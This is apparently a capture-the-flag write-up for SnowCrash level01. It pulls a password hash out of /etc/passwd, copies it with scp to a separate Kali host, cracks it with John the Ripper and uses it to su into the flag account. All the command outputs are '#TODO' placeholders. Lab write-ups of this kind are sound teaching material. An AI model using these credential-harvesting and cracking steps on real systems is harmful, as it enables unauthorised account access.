# level01

Get incredibly lucky and notice a password hash in `/etc/passwd`
```bash
level01:~ $ grep -R flag01 /etc/
#TODO output
level01:~ $ grep flag01 /etc/passwd > /tmp/passwd
level01:~ $ scp /tmp/passwd kali@kali:flag01pass
```

The hash is a descrypt, traditional `crypt(3)` which is long obsolete and insecure
Crack hash with John-The-Ripper
```bash
root@kali:~# john --show flag01pass
#TODO output
root@kali:~#
```

Claim flag
```bash
level01@SnowCrash:~ $ rm -f /tmp/passwd
level01@SnowCrash:~ $ su flag01
#TODO password
flag01@SnowCrash:~ $ getflag
#TODO output
level02@SnowCrash:~ $ su level02
#TODO more output
```
